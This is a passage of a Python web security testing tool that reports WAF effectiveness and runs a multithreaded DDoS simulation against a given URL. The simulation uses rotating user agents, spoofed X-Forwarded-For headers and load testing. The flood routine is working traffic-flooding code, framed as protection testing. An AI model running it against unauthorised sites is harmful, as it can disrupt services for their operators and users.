                    print(f"        - {response['method']} | {status_color}{response['status_code']}{Colors.ENDC} | {response['block_reason']} | Size: {response.get('response_size', 0)} bytes")

        # Calculate and display security effectiveness
        malicious_tests = [test for test in waf_results if test['should_block']]
        legitimate_tests = [test for test in waf_results if not test['should_block']]
        
        print_subsection("Security Effectiveness Summary", "🎯", Colors.OKGREEN)
        
        if malicious_tests:
            malicious_blocked = sum(test['blocked_count'] for test in malicious_tests)
            malicious_total = sum(test['blocked_count'] + test['allowed_count'] for test in malicious_tests)
            malicious_block_rate = (malicious_blocked / malicious_total) * 100 if malicious_total > 0 else 0
            
            print(f"    🛡️  Malicious Traffic Blocked: {Colors.BOLD}{malicious_block_rate:.1f}%{Colors.ENDC} ({malicious_blocked}/{malicious_total})")
        
        if legitimate_tests:
            legitimate_blocked = sum(test['blocked_count'] for test in legitimate_tests)
            legitimate_total = sum(test['blocked_count'] + test['allowed_count'] for test in legitimate_tests)
            false_positive_rate = (legitimate_blocked / legitimate_total) * 100 if legitimate_total > 0 else 0
            
            print(f"    📊 False Positive Rate: {Colors.BOLD}{false_positive_rate:.1f}%{Colors.ENDC} ({legitimate_blocked}/{legitimate_total})")
            
            if false_positive_rate == 0:
                print(f"    {Colors.OKGREEN}✅ No legitimate traffic blocked{Colors.ENDC}")
            elif false_positive_rate < 10:
                print(f"    {Colors.WARNING}⚠️  Low false positive rate{Colors.ENDC}")
            else:
                print(f"    {Colors.FAIL}❌ High false positive rate - review WAF rules{Colors.ENDC}")

    def test_ddos_protection(self, duration=60, target_rps=500, max_threads=50):
        """Test DDoS protection with high request rate simulation"""
        print_section_separator("DDOS PROTECTION TEST", "🚨", Colors.FAIL)
        print(f"Testing DDoS protection with target {target_rps} requests/second for {duration} seconds...")
        print(f"Using {max_threads} concurrent threads to simulate attack traffic")
        print(f"{Colors.WARNING}⚠️  This test will generate high traffic - ensure you have permission to test this target!{Colors.ENDC}")
        
        # Confirm before starting aggressive test
        if not self.verbose:
            print(f"Starting DDoS simulation in 5 seconds... (Use -v flag to skip this delay)")
            time.sleep(5)
        
        start_time = time.time()
        results = []
        total_requests = 0
        blocked_requests = 0
        error_requests = 0
        rate_limited_requests = 0
        
        # DDoS protection indicators
        ddos_indicators = {
            'status_codes': [429, 503, 520, 521, 522, 523, 524],
            'keywords': ['rate limit', 'too many requests', 'ddos protection', 'security check', 'temporarily unavailable'],
            'small_response_threshold': 1000  # bytes
        }
        
        protection_detected = False
        protection_start_time = None
        
        # Progress tracking
        progress = ProgressBar(duration, "DDoS Test (seconds)")
        
        def ddos_worker():
            nonlocal total_requests, blocked_requests, error_requests, rate_limited_requests, protection_detected, protection_start_time
            
            while time.time() - start_time < duration:
                # Randomize requests to simulate real attack
                test_paths = ['/', '/index.html', '/login', '/search', '/api', '/admin']
                random_path = random.choice(test_paths)
                
                # Random user agents to simulate botnet
                user_agents = [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                    'WEBESCTOR-DDoS-Test/3.1'
                ]
                
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                
                result = self.measure_request(
                    url=f"{self.base_url}{random_path}",
                    headers=headers
                )
                
                total_requests += 1
                
                if result['success']:
                    status_code = result['status_code']
                    response_size = result.get('response_size', 0)
                    response_text = result.get('response_text', '').lower()
                    
                    # Check for DDoS protection indicators
                    is_ddos_blocked = False
                    
                    # Status code check
                    if status_code in ddos_indicators['status_codes']:
                        is_ddos_blocked = True
                        if status_code == 429:
                            rate_limited_requests += 1
                        blocked_requests += 1
                    
                    # Response content check
                    elif any(keyword in response_text for keyword in ddos_indicators['keywords']):
                        is_ddos_blocked = True
                        blocked_requests += 1
                    
                    # Small response size (typical of blocking pages)
                    elif response_size < ddos_indicators['small_response_threshold'] and status_code != 200:
                        is_ddos_blocked = True
                        blocked_requests += 1
                    
                    if is_ddos_blocked and not protection_detected:
                        protection_detected = True
                        protection_start_time = time.time() - start_time
                        print(f"\n  🛡️  {Colors.WARNING}DDoS Protection Triggered at {protection_start_time:.1f}s{Colors.ENDC}")
                    
                    results.append(result)
                else:
                    error_requests += 1
                
                # Control request rate
                time.sleep(max_threads / target_rps)
        
        # Start DDoS simulation with multiple threads
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(ddos_worker) for _ in range(max_threads)]
            
            # Monitor progress
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                progress.current = int(elapsed)
                progress._print_progress()
                time.sleep(1)
            
            # Wait for all threads to complete
            for future in as_completed(futures, timeout=10):
                try:
                    future.result()
                except Exception as e:
                    if self.verbose:
                        print(f"\n  ⚠️  Thread error: {e}")
        
        progress.current = duration
        progress._print_progress()
        
        end_time = time.time()
        actual_duration = end_time - start_time
        actual_rps = total_requests / actual_duration if actual_duration > 0 else 0
        
        # Calculate statistics
        successful_requests = total_requests - error_requests - blocked_requests
        block_rate = (blocked_requests / total_requests) * 100 if total_requests > 0 else 0
        error_rate = (error_requests / total_requests) * 100 if total_requests > 0 else 0
        
        ddos_test_results = {
            'test_duration': actual_duration,
            'target_rps': target_rps,
            'actual_rps': actual_rps,
            'total_requests': total_requests,
            'successful_requests': successful_requests,
            'blocked_requests': blocked_requests,
            'rate_limited_requests': rate_limited_requests,
            'error_requests': error_requests,
            'block_rate': block_rate,
            'error_rate': error_rate,
            'protection_detected': protection_detected,
            'protection_trigger_time': protection_start_time,
            'max_threads': max_threads
        }
        
        self.results['ddos_tests'] = ddos_test_results
        self._print_ddos_results(ddos_test_results)
    
    def _print_ddos_results(self, results):
        """Print DDoS testing results"""
        print_subsection("DDoS Protection Test Results", "📊", Colors.OKGREEN)
        
        print(f"  🎯 Total Requests Sent: {Colors.BOLD}{results['total_requests']}{Colors.ENDC}")
        print(f"  ⏱️  Test Duration: {Colors.BOLD}{results['test_duration']:.1f}s{Colors.ENDC}")
        print(f"  🚀 Actual RPS: {Colors.BOLD}{results['actual_rps']:.1f}{Colors.ENDC} (Target: {results['target_rps']})")
        print(f"  🧵 Concurrent Threads: {Colors.BOLD}{results['max_threads']}{Colors.ENDC}")
        
        print(f"\n{Colors.BOLD}📊 Request Distribution:{Colors.ENDC}")
        print(f"    ✅ Successful: {Colors.OKGREEN}{results['successful_requests']}{Colors.ENDC}")
        print(f"    🛡️  Blocked: {Colors.WARNING}{results['blocked_requests']}{Colors.ENDC}")
        print(f"    ⏳ Rate Limited: {Colors.FAIL}{results['rate_limited_requests']}{Colors.ENDC}")
        print(f"    ❌ Errors: {Colors.FAIL}{results['error_requests']}{Colors.ENDC}")
        
        print(f"\n{Colors.BOLD}📈 Protection Effectiveness:{Colors.ENDC}")
        print(f"    Block Rate: {Colors.BOLD}{results['block_rate']:.1f}%{Colors.ENDC}")
        print(f"    Error Rate: {Colors.BOLD}{results['error_rate']:.1f}%{Colors.ENDC}")
        
        if results['protection_detected']:
            print(f"\n  🛡️  {Colors.OKGREEN}DDoS Protection Status: ACTIVE{Colors.ENDC}")
            if results['protection_trigger_time']:
                print(f"    ⚡ Protection triggered after: {Colors.BOLD}{results['protection_trigger_time']:.1f}s{Colors.ENDC}")
            
            if results['block_rate'] > 50:
                print(f"    🎯 Assessment: {Colors.OKGREEN}Strong DDoS Protection{Colors.ENDC}")
            elif results['block_rate'] > 20:
                print(f"    🎯 Assessment: {Colors.WARNING}Moderate DDoS Protection{Colors.ENDC}")
            else:
                print(f"    🎯 Assessment: {Colors.FAIL}Weak DDoS Protection{Colors.ENDC}")
        else:
            print(f"\n  ❌ {Colors.FAIL}DDoS Protection Status: NOT DETECTED{Colors.ENDC}")
            print(f"    ⚠️  Assessment: {Colors.FAIL}No DDoS protection detected or protection threshold not reached{Colors.ENDC}")
        
        print_subsection("Monitoring Recommendations", "💡", Colors.OKCYAN)
        print(f"    • Check cloud platform DDoS protection metrics")
        print(f"    • Monitor server resource utilization during test")
        print(f"    • Review access logs for blocked requests")
        print(f"    • Verify alert notifications were triggered")

    def perform_load_testing(self, num_threads=10, requests_per_thread=20):
        """Perform load testing with multiple threads"""
        print_section_separator("LOAD TESTING", "⚡", Colors.WARNING)
        print(f"Performing load test with {num_threads} threads, {requests_per_thread} requests per thread...")

        total_requests = num_threads * requests_per_thread
        progress = ProgressBar(total_requests, "Load Test")

        results = []

        def worker_thread():
            thread_results = []
            for _ in range(requests_per_thread):
                result = self.measure_request()
                thread_results.append(result)
                progress.update()
            return thread_results

        start_time = time.time()

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(worker_thread) for _ in range(num_threads)]

            for future in as_completed(futures):
                try:
                    thread_results = future.result()
                    results.extend(thread_results)
                except Exception as e:
                    pass

        end_time = time.time()

        successful_requests = [r for r in results if r['success']]

        if successful_requests:
            latencies = [r['total_time'] for r in successful_requests]

            load_test_stats = {
                'total_requests': total_requests,
                'successful_requests': len(successful_requests),
                'failed_requests': len(results) - len(successful_requests),
                'success_rate': (len(successful_requests) / total_requests) * 100,
                'total_test_time': end_time - start_time,
                'requests_per_second': total_requests / (end_time - start_time),
                'avg_latency': statistics.mean(latencies),
                'min_latency': min(latencies),
                'max_latency': max(latencies),
                'median_latency': statistics.median(latencies),
                'p95_latency': sorted(latencies)[int(0.95 * len(latencies))],
                'p99_latency': sorted(latencies)[int(0.99 * len(latencies))],
                'std_dev': statistics.stdev(latencies) if len(latencies) > 1 else 0
            }

            self.results['load_tests'] = load_test_stats
            self._print_load_test_results(load_test_stats)
        else:
            print(f"\n  {Colors.FAIL}❌ All load test requests failed{Colors.ENDC}")

    def _print_load_test_results(self, stats):
        """Print load testing results"""
        print_subsection("Load Test Results", "📊", Colors.OKGREEN)
        
        print(f"  🎯 Total Requests: {Colors.BOLD}{stats['total_requests']}{Colors.ENDC}")
        print(f"  ✅ Success Rate: {Colors.BOLD}{stats['success_rate']:.1f}%{Colors.ENDC}")
        print(f"  🚀 Requests/Second: {Colors.BOLD}{stats['requests_per_second']:.2f}{Colors.ENDC}")
        print(f"  ⏱️  Average Latency: {Colors.BOLD}{stats['avg_latency']:.2f}ms{Colors.ENDC}")

    def calculate_security_score(self):
        """Calculate overall security score"""
        score = 0

        # Security headers score (30%)
        if self.results['security_analysis']['headers']:
            headers_score = self.results['security_analysis']['headers'].get('score', 0)
            score += (headers_score / 100) * 30

        # WAF protection score (25%)
        if self.results['waf_tests']:
            total_blocked = sum(test['blocked_count'] for test in self.results['waf_tests'])
            total_tests = sum(test['blocked_count'] + test['allowed_count'] for test in self.results['waf_tests'])
            if total_tests > 0:
                block_rate = (total_blocked / total_tests) * 100
                score += (block_rate / 100) * 25

        # DDoS protection score (25%)
        if self.results['ddos_tests']:
            ddos_results = self.results['ddos_tests']
            if ddos_results['protection_detected']:
                ddos_score = min(ddos_results['block_rate'], 100)
                score += (ddos_score / 100) * 25

        # SSL/HTTPS score (20%)
        if self.results['infrastructure']['ssl_info'] and 'error' not in self.results['infrastructure']['ssl_info']:
            score += 20
        elif self.parsed_url.scheme == 'https':
            score += 10

        self.results['security_score'] = max(0, min(score, 100))
        return self.results['security_score']

    def save_results_to_file(self, filename=None):
        """Save detailed results to JSON file"""
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            domain_safe = self.domain.replace('.', '_').replace(':', '_')
            filename = f"webesctor_results_{domain_safe}_{timestamp}.json"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, default=str)
            print(f"\n  💾 Results saved to: {Colors.BOLD}{filename}{Colors.ENDC}")
        except Exception as e:
            print(f"\n  ❌ Error saving results: {e}")

    def print_final_summary(self):
        """Print comprehensive final summary"""
        print_section_separator("FINAL ANALYSIS SUMMARY", "🎯", Colors.HEADER)

        print(f"\n{Colors.BOLD}📊 Target Information:{Colors.ENDC}")
        print(f"  🌐 URL: {self.base_url}")
        print(f"  🏠 Domain: {self.domain}")
        print(f"  🕐 Test Duration: {self.results['test_info']['test_duration']:.1f}s")

        security_score = self.calculate_security_score()
        score_color = Colors.OKGREEN if security_score >= 80 else Colors.WARNING if security_score >= 60 else Colors.FAIL
        print(f"\n{Colors.BOLD}🛡️  Overall Security Score: {score_color}{security_score:.1f}/100{Colors.ENDC}")

        # Summary by protection type
        print(f"\n{Colors.BOLD}🔍 Protection Summary:{Colors.ENDC}")
        
        # WAF Detection Summary
        if self.results['waf_detection']:
            detected_waf = self.results['waf_detection'][0]['name'] if self.results['waf_detection'] else "None"
            print(f"  🛡️  WAF/CDN Detected: {Colors.BOLD}{detected_waf}{Colors.ENDC}")
        
        # WAF Effectiveness Summary
        if self.results['waf_tests']:
            total_blocked = sum(test['blocked_count'] for test in self.results['waf_tests'])
            total_tests = sum(test['blocked_count'] + test['allowed_count'] for test in self.results['waf_tests'])
            waf_block_rate = (total_blocked / total_tests) * 100 if total_tests > 0 else 0
            waf_status = "Strong" if waf_block_rate > 80 else "Moderate" if waf_block_rate > 50 else "Weak"
            print(f"  🎯 WAF Effectiveness: {waf_status} ({waf_block_rate:.1f}% block rate)")
        
        # DDoS Summary
        if self.results['ddos_tests']:
            ddos_results = self.results['ddos_tests']
            ddos_status = "Active" if ddos_results['protection_detected'] else "Not Detected"
            print(f"  🚨 DDoS Protection: {ddos_status} ({ddos_results['block_rate']:.1f}% block rate)")
        
        # Performance Summary
        if self.results['baseline']:
            print(f"  ⚡ Baseline Performance: {self.results['baseline']['avg_latency']:.2f}ms avg")
        
        print(f"\n{Colors.BOLD}💡 Key Recommendations:{Colors.ENDC}")
        recommendations = []
        
        if security_score < 70:
            recommendations.append("• Improve overall security posture")
        
        if self.results['security_analysis']['headers'].get('score', 0) < 70:
            recommendations.append("• Implement missing security headers")
        
        if self.results['waf_tests']:
            malicious_tests = [test for test in self.results['waf_tests'] if test['should_block']]
            if malicious_tests:
                malicious_blocked = sum(test['blocked_count'] for test in malicious_tests)
                malicious_total = sum(test['blocked_count'] + test['allowed_count'] for test in malicious_tests)
                if malicious_total > 0 and (malicious_blocked / malicious_total) < 0.8:
                    recommendations.append("• Strengthen WAF rules and policies")
        
        if self.results['ddos_tests'] and not self.results['ddos_tests']['protection_detected']:
            recommendations.append("• Consider implementing DDoS protection")
        
        if not self.results['waf_detection']:
            recommendations.append("• Consider implementing WAF/CDN protection")
        
        if recommendations:
            for rec in recommendations:
                print(f"  {rec}")
        else:
            print(f"  ✅ Security posture appears strong")

        print(f"\n{Colors.OKGREEN}✅ Analysis completed successfully!{Colors.ENDC}")
        print(f"💡 Monitor your SIEM or Log Management to review this Events")
        
        print_section_separator("END OF ANALYSIS", "🏁", Colors.HEADER)

    def run_comprehensive_analysis(self, include_ddos=True, ddos_duration=60, ddos_rps=500, ddos_threads=50):
        """Run the complete analysis suite"""
        start_time = time.time()

        try:
            self.print_banner()
            self.analyze_infrastructure()
            self.detect_waf()  # Enhanced WAF detection
            self.analyze_security_posture()
            self.test_baseline_performance()
            self.test_waf_bypass_techniques()
            self.perform_load_testing()
            
            if include_ddos:
                print(f"\n{Colors.WARNING}⚠️  WARNING: About to start DDoS protection testing{Colors.ENDC}")
                print(f"This will generate high traffic to test DDoS protection mechanisms.")
                self.test_ddos_protection(duration=ddos_duration, target_rps=ddos_rps, max_threads=ddos_threads)
            
            end_time = time.time()
            self.results['test_info']['test_duration'] = end_time - start_time
            
            self.print_final_summary()
            self.save_results_to_file()

        except KeyboardInterrupt:
            print(f"\n\n{Colors.WARNING}⚠️  Analysis interrupted by user{Colors.ENDC}")
            end_time = time.time()
            self.results['test_info']['test_duration'] = end_time - start_time
            self.save_results_to_file()
        except Exception as e:
            print(f"\n\n{Colors.FAIL}❌ Fatal error during analysis: {str(e)}{Colors.ENDC}")
            if self.verbose:
                import traceback
                traceback.print_exc()

def main():
    """Main function to handle command line arguments and run the tool"""
    parser = argparse.ArgumentParser(
        description='WEBESCTOR Pro v3.1 - Enhanced Web Security & Analysis Tool with DDoS Testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python webesctor_pro.py -u https://example.com
  python webesctor_pro.py -u https://example.com -v
  python webesctor_pro.py -u https://example.com -D 120 -R 1000 -T 100
  python webesctor_pro.py -u https://example.com --no-ddos -b 100
        """
    )

    # Basic options with both short and long flags
    parser.add_argument('-u', '--url', required=True, help='Target URL to analyze')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    
    # Testing configuration with short flags
    parser.add_argument('-b', '--baseline-requests', type=int, default=50, help='Number of requests for baseline test (default: 50)')
    parser.add_argument('-l', '--load-threads', type=int, default=10, help='Number of threads for load testing (default: 10)')
    parser.add_argument('-r', '--load-requests', type=int, default=20, help='Requests per thread for load testing (default: 20)')
    
    # DDoS testing options with short flags
    parser.add_argument('--no-ddos', action='store_true', help='Disable DDoS protection testing')
    parser.add_argument('-D', '--ddos-duration', type=int, default=60, help='DDoS test duration in seconds (default: 60)')
    parser.add_argument('-R', '--ddos-rps', type=int, default=500, help='Target requests per second for DDoS test (default: 500)')
    parser.add_argument('-T', '--ddos-threads', type=int, default=50, help='Number of threads for DDoS test (default: 50)')

    args = parser.parse_args()

    if not args.url.startswith(('http://', 'https://')):
        print(f"{Colors.FAIL}❌ Error: URL must start with http:// or https://{Colors.ENDC}")
        sys.exit(1)

    # Validate DDoS testing parameters
    if args.ddos_rps > 2000:
        print(f"{Colors.WARNING}⚠️  Warning: Very high RPS ({args.ddos_rps}) requested. This may cause service disruption.{Colors.ENDC}")
        confirm = input("Continue? (y/N): ")
        if confirm.lower() != 'y':
            print("Aborting...")
            sys.exit(0)

    if args.ddos_duration > 300:
        print(f"{Colors.WARNING}⚠️  Warning: Long test duration ({args.ddos_duration}s) requested.{Colors.ENDC}")
        confirm = input("Continue? (y/N): ")
        if confirm.lower() != 'y':
            print("Aborting...")
            sys.exit(0)

    try:
        analyzer = WebesctorPro(args.url, verbose=args.verbose)
        
        # Determine if DDoS testing should be enabled
        include_ddos = not args.no_ddos  # DDoS testing enabled by default unless --no-ddos specified
        
        if include_ddos:
            print(f"{Colors.OKGREEN}🚀 Starting comprehensive analysis with DDoS protection testing...{Colors.ENDC}")
            print(f"DDoS Test Parameters: {args.ddos_duration}s duration, {args.ddos_rps} RPS target, {args.ddos_threads} threads")
        else:
            print(f"{Colors.OKGREEN}🚀 Starting comprehensive analysis (DDoS testing disabled)...{Colors.ENDC}")
        
        analyzer.run_comprehensive_analysis(
            include_ddos=include_ddos,
            ddos_duration=args.ddos_duration,
            ddos_rps=args.ddos_rps,
            ddos_threads=args.ddos_threads
        )

    except Exception as e:
        print(f"{Colors.FAIL}❌ Fatal error: {str(e)}{Colors.ENDC}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()